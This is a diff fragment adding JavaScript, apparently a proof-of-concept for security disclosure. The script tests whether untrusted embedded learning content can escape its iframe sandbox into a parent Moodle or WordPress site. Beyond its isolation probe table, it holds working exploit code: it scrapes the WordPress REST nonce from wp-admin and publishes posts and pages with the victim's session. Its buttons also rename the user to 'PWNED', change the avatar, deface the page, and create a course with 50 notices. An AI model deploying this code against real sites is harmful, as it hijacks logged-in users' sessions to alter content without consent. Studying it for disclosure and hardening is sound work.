+    if (window.origin === 'null' || location.origin === 'null') { cb('BLOQUEADO (origen opaco / modo secure)'); return; }
+    var res = { posts: [], pages: [] };
+    var w = window.parent, root = location.origin;
+    try {
+      var getNonce = function () {
+        try { if (w.wpApiSettings && w.wpApiSettings.nonce) { return Promise.resolve(w.wpApiSettings.nonce); } } catch (e) {}
+        return w.fetch(root + '/wp-admin/', { credentials: 'same-origin' })
+          .then(function (r) { return r.text(); })
+          .then(function (html) {
+            var m = html.match(/createNonceMiddleware\(\s*["']([0-9a-f]+)["']/)
+                 || html.match(/"nonce":"([0-9a-f]+)"/)
+                 || html.match(/wpApiSettings[\s\S]{0,120}?nonce["']?\s*[:=]\s*["']([0-9a-f]+)/);
+            return m ? m[1] : null;
+          });
+      };
+      getNonce().then(function (nonce) {
+        if (!nonce) { cb('sin nonce REST (abre wp-admin / ¿admin?)'); return; }
+        var headers = { 'Content-Type': 'application/json', 'X-WP-Nonce': nonce };
+        var create = function (type, title) {
+          return w.fetch(root + '/wp-json/wp/v2/' + type, {
+            method: 'POST', credentials: 'same-origin', headers: headers,
+            body: JSON.stringify({ title: title, content: '<p>Creado por la PoC (contenido no confiable).</p>', status: 'publish' })
+          }).then(function (r) { return r.json().catch(function () { return {}; }).then(function (j) { return r.ok ? ('#' + j.id) : ('HTTP ' + r.status); }); });
+        };
+        Promise.all([
+          create('posts', '[PoC] Entrada 1 creada por contenido no confiable'),
+          create('posts', '[PoC] Entrada 2 creada por contenido no confiable'),
+          create('pages', '[PoC] Página 1 creada por contenido no confiable'),
+          create('pages', '[PoC] Página 2 creada por contenido no confiable')
+        ]).then(function (r) {
+          res.posts = [r[0], r[1]]; res.pages = [r[2], r[3]];
+          res.note = 'Revisa Entradas y Páginas en wp-admin. Reversibles (papelera).';
+          cb(JSON.stringify(res, null, 2));
+        }).catch(function (e) { cb('ERR: ' + (e.message || e.name)); });
+      }).catch(function (e) { cb('BLOQUEADO: ' + e.name + ' (origen opaco / modo secure)'); });
+    } catch (e) { cb('BLOQUEADO: ' + e.name + ' (origen opaco / modo secure)'); }
+  };
+
+  function render() {
+    try {
+      var order = [
+        'canRunJavascript', 'isOpaqueOrigin', 'sandboxAttr', 'sandboxAllowsSameOrigin',
+        'canAccessParent', 'canReadParentDocument', 'canReadParentCookie',
+        'parentCookieValue', 'canFindSesskey', 'sesskeyValue',
+        'canFindCourseEditForms', 'canFindCourseEditLinks', 'canSubmitCourseEditForm',
+        'canAccessTop', 'canAttemptTopNavigation', 'canOpenPopups',
+        'canUsePostMessage', 'canPostMessageToParent',
+        'canCallScormApi', 'scormApiFlavor',
+        'canUseLocalStorage', 'canUseSessionStorage',
+        'sandboxEscape', 'sandboxEscapeAttempted'
+      ];
+      // Semántica del color: verde = SEGURO (contenido aislado), rojo = capacidad
+      // PELIGROSA alcanzada (escape), gris = informativo. El "valor seguro" depende
+      // del campo: p.ej. isOpaqueOrigin bueno = true; los vectores de escape buenos = false.
+      var SAFE_FALSE = { canAccessParent: 1, canReadParentDocument: 1, canReadParentCookie: 1,
+        canFindSesskey: 1, canFindCourseEditForms: 1, canFindCourseEditLinks: 1, canAccessTop: 1,
+        sandboxAllowsSameOrigin: 1, canCallScormApi: 1, canUseLocalStorage: 1, canUseSessionStorage: 1,
+        sandboxEscape: 1, sandboxEscapeAttempted: 1 };
+      var SAFE_TRUE = { isOpaqueOrigin: 1 };
+      var rows = '';
+      for (var i = 0; i < order.length; i++) {
+        var k = order[i], v = R[k];
+        var disp = (typeof v === 'boolean') ? (v ? 'true' : 'false') : String(v);
+        var color = '#555'; // informativo por defecto
+        if (typeof v === 'boolean') {
+          if (SAFE_FALSE[k]) { color = v ? '#b00020' : '#0a7d28'; }        // escape: false=verde
+          else if (SAFE_TRUE[k]) { color = v ? '#0a7d28' : '#b00020'; }    // contención: true=verde
+        }
+        rows += '<tr><td style="padding:4px 10px;border:1px solid #ddd;font-family:monospace">' + k +
+                '</td><td style="padding:4px 10px;border:1px solid #ddd;font-family:monospace;color:' +
+                color + '">' + disp + '</td></tr>';
+      }
+      var errs = '';
+      for (var ek in R.errors) { if (R.errors.hasOwnProperty(ek) && R.errors[ek]) {
+        errs += '<tr><td style="padding:4px 10px;border:1px solid #ddd;font-family:monospace">' + ek +
+                '</td><td style="padding:4px 10px;border:1px solid #ddd;font-family:monospace;color:#555">' +
+                R.errors[ek] + '</td></tr>'; } }
+      var html =
+        '<div id="exe-poc-panel" style="position:fixed;top:12px;right:12px;width:min(460px,92vw);max-height:90vh;overflow:auto;z-index:2147483647;' +
+        'font:13px/1.4 system-ui,Arial,sans-serif;background:#fff;color:#1a1a1a;border:2px solid #b00020;border-radius:8px;padding:14px;' +
+        'box-shadow:0 10px 34px rgba(0,0,0,.4);box-sizing:border-box;overflow-wrap:anywhere">' +
+        '<button id="exe-poc-close" type="button" title="cerrar" style="float:right;border:0;background:#b00020;color:#fff;border-radius:4px;cursor:pointer;padding:2px 9px;font-size:13px">✕</button>' +
+        '<h2 style="margin:0 0 4px;font-size:16px">PoC SEGURA — sonda de aislamiento</h2>' +
+        '<p style="margin:0 0 12px;color:#444">Solo booleanos + nombres de error <b>redacted</b>. ' +
+        'La sonda (tabla) solo mide: no lee valores reales de cookies/sesskey ni hace red o POST ' +
+        '(las acciones de demostración, abajo, sí —autorizadas y reversibles, solo en modo legacy—). ' +
+        '<span style="color:#0a7d28">verde = seguro</span>, ' +
+        '<span style="color:#b00020">rojo = capacidad peligrosa alcanzada</span>, ' +
+        '<span style="color:#555">gris = informativo</span>.</p>' +
+        '<table style="border-collapse:collapse;width:100%">' + rows + '</table>' +
+        (errs ? '<h3 style="margin:14px 0 4px">Errores (redacted)</h3>' +
+                '<table style="border-collapse:collapse;width:100%">' + errs + '</table>' : '') +
+        '<div style="margin-top:14px;border-top:1px dashed #b00020;padding-top:10px">' +
+        '<b>Demostración (para vídeo) — acciones VISIBLES sobre el padre (Moodle + WordPress):</b><br>' +
+        '<button id="exe-d4" type="button" style="margin:6px 6px 0 0">👤 Cambiar nombre + foto del usuario</button>' +
+        '<button id="exe-d1" type="button" style="margin:6px 6px 0 0">🔄 Voltear la página (espejo)</button>' +
+        '<button id="exe-d3" type="button" style="margin:6px 6px 0 0">🏗 Crear curso + etiqueta + 50 avisos</button>' +
+        '<button id="exe-d2" type="button" style="margin:6px 6px 0 0">↩ Restaurar</button>' +
+        '<br><small style="color:#b00020">WordPress:</small><br>' +
+        '<button id="exe-w1" type="button" style="margin:6px 6px 0 0">🖉 WP: cambiar nombre → PWNED</button>' +
+        '<button id="exe-w2" type="button" style="margin:6px 6px 0 0">🖼 WP: avatar + subir a Media</button>' +
+        '<button id="exe-w3" type="button" style="margin:6px 6px 0 0">🗂 WP: crear 2 entradas + 2 páginas</button>' +
+        '<pre id="exe-demo-out" style="white-space:pre-wrap;background:#f6f8fa;border:1px solid #e1e4e8;border-radius:4px;padding:6px;margin-top:8px;font-size:11px"></pre>' +
+        '<small style="color:#777">En modo <b>secure</b> (origen opaco) estas acciones devuelven <code>SecurityError</code>; en <b>legacy</b> (mismo origen) se ejecutan.</small>' +
+        '</div>' +
+        '</div>';
+      var host = document.createElement('div');
+      host.id = 'exe-poc-result';
+      host.innerHTML = html;
+      (document.body || document.documentElement).appendChild(host);
+      // Listeners de la demo (evita onclick inline por si hay CSP estricta).
+      var out = document.getElementById('exe-demo-out');
+      var show = function (x) { if (out) { out.textContent = (typeof x === 'string') ? x : JSON.stringify(x, null, 2); } };
+      var cl = document.getElementById('exe-poc-close');
+      if (cl) { cl.addEventListener('click', function () { var h = document.getElementById('exe-poc-result'); if (h && h.parentNode) { h.parentNode.removeChild(h); } }); }
+      var d1 = document.getElementById('exe-d1'); if (d1) { d1.addEventListener('click', function () { show(window.exePocDeface()); }); }
+      var d2 = document.getElementById('exe-d2'); if (d2) { d2.addEventListener('click', function () { show(window.exePocRestore()); }); }
+      var d3 = document.getElementById('exe-d3'); if (d3) { d3.addEventListener('click', function () { show('creando curso + actividad…'); window.exePocCreateCourse(show); }); }
+      var d4 = document.getElementById('exe-d4'); if (d4) { d4.addEventListener('click', function () { show('cambiando nombre + foto del usuario…'); window.exePocOwnUser(show); }); }
+      var w1 = document.getElementById('exe-w1'); if (w1) { w1.addEventListener('click', function () { show('WP: intentando cambiar el nombre…'); window.exePocWpRename(show); }); }
+      var w2 = document.getElementById('exe-w2'); if (w2) { w2.addEventListener('click', function () { show('WP: intentando cambiar avatar + subir a Media…'); window.exePocWpPhoto(show); }); }
+      var w3 = document.getElementById('exe-w3'); if (w3) { w3.addEventListener('click', function () { show('WP: creando 2 entradas + 2 páginas…'); window.exePocWpCreateContent(show); }); }
+    } catch (e) { /* rendering is best-effort */ }
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', render);
+  } else {
+    render();
+  }
+})();
